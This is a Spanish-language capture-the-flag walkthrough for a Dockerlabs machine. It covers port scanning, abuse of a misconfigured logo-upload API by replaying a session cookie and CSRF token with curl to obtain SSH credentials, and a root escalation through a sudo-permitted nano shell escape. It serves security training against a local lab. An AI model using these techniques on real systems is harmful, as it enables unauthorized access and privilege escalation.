
---
# Writeup Template: Maquina `[ Perrito Magico ]`

- Tags: 
- Dificultad: `[ Medium ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Perrito Magico](https://mega.nz/file/KZlCwQCb#A2u1H9AN0HwbF__bITavpCiTm4LaiWpBH5Qz80qes9Y) Laboratorio para explotar una vulnerabilidad presente en versiones anteriores de dockerlabs, una API mal configurada que permitía cambiar el logo de una máquina a cualquier persona registrada sin importar el rol (en la máquina, visitar la ruta api/ para conocer el endpoint vulnerable y cambiar la foto de la máquina)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x perrito_magico.zip
sudo bash auto_deploy.sh perrito_magico.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,5000 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.4 (Python 3.12.3)
```
**Werkzeug**
es una colección de bibliotecas de utilidades para crear aplicaciones web en Python que usan el estándar WSGI. Es fundamental para la comunicación entre un servidor web y una aplicación Python, pero también proporciona herramientas para tareas como el manejo de errores, el enrutamiento de URL y la seguridad, como el hashing de contraseñas. Werkzeug sirve como base para frameworks web más grandes como Flask.

---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2:5000/bunkerlabs
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2:5000
http://172.17.0.2:5000/bunkerlabs [200 OK] Bootstrap, Cookies[session], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.4 Python/3.12.3], HttpOnly[session], IP[172.17.0.2], Python[3.12.3], Script, Strict-Transport-Security[max-age=63072000; includeSubDomains; pre  
load], Title[BunkerLabs], UncommonHeaders[x-content-type-options,referrer-policy], Werkzeug[3.1.4], X-Frame-Options[DENY]
```

Ingresando al **API** cambiando el metodo:
```http
POST /api/gestion-maquinas/upload-logo HTTP/1.1
Host: 172.17.0.2:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: session=.eJwlzDsOwjAMANC7eGZwUse1e5kqsRMUIVLUz4S4O0iMb3lvsGNv67k96oAFsAkXiY40EwoboobIbiJZSmTR3OagHjwRuRbzPCUVssI8oUWDG1xH3dfusARJf438rL_71cf96qOfG3y-FwQjrw.aTHh5A.Lsp-B81WE9IgMdYlqMw0e7R2qPo
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
```

En la respuesta del servidor vemos lo siguiente que son los metodo aceptado
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.3
Date: Thu, 04 Dec 2025 19:43:07 GMT
Content-Type: text/html; charset=utf-8
Allow: HEAD, GET, OPTIONS
```

Lanzamos una peticion con curl:
```bash
curl -s -X POST http://172.17.0.2:5000/gestion-maquinas/upload-logo  
{"error":"CSRF token missing"}
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
En esta url tenemos los parametros necesarios para explotar la API
```http
http://172.17.0.2:5000/api/
```

Parametros
```text
machine_idi nteger ID of the machine
origen string Origin of the machine
logo string($binary) Image file to upload
```

Y el **csrfToken** lo obtenemos revisando el codigo fuente en **GestionMaquinas**
```html
<meta name="csrf-token" content="0f86b82d0474086c009126dc88a8b2689af719d1d544d9bcda35984cb6630c2c">
```
### Ejecucion del Ataque
Para ejecutar el ataque necesitamos las cabeceras HTTP siguientes
```bash
# Comandos para explotación
curl -s -X POST "http://172.17.0.2:5000/gestion-maquinas/upload-logo" -H "Cookie: session=.eJwlzDsOwjAMANC7eGZwUse1e5kqsRMUIVLUz4S4O0iMb3lvsGNv67k96oAFsAkXiY40EwoboobIbiJZSmTR3OagHjwRuRbzPCUVssI8oUWDG1xH3dfusARJf438rL_71cf96qOfG3y-FwQjrw.aTHh5A.Lsp-B81WE9IgMdYlqMw0e7  
R2qPo" -H "X-CSRFToken: 0f86b82d0474086c009126dc88a8b2689af719d1d544d9bcda35984cb6630c2c" --form "machine_id=1" --form "origen=bunker" --form "logo=@fondo1.jpg"
```

Respuesta
```bash
{"exploit_message":"Enhorabuena, has conseguido explotar la vulnerabilidad de la API, que permite cambiar la imagen del logo de la maquina a usuarios con rol de usuario. Ahora puedes entrar por SSH con las credenciales: balulerobalulito:megapassword","exploit_triggered  
":true,"filename":"Dockerlabs-Weak.png","image_path":"logos-bunkerlabs/Dockerlabs-Weak.png","message":"Logo subido correctamente"}
```
### Intrusion
Ahora nos conectamos con las credenciales obtenidas
```bash
# Reverse shell o acceso inicial
ssh balulerobalulito@172.17.0.2
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion Usuarios
cat /etc/passwd | grep "sh"  

root:x:0:0:root:/root:/bin/bash  
balulerobalulito:x:1001:1001::/home/balulerobalulito:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ BaluleritoBalulero ]`:
Listando los permisos para este usuario tenemos lo siguiente
```bash
sudo -l

User balulerobalulito may run the following commands on 6bd97f3c4ca8:  
   (ALL) NOPASSWD: /usr/bin/nano
```

Explotamos el privilegio
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/nano

reset; bash 1>&0 2>&0
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@6bd97f3c4ca8:/home/balulerobalulito# whoami  
root
```
---
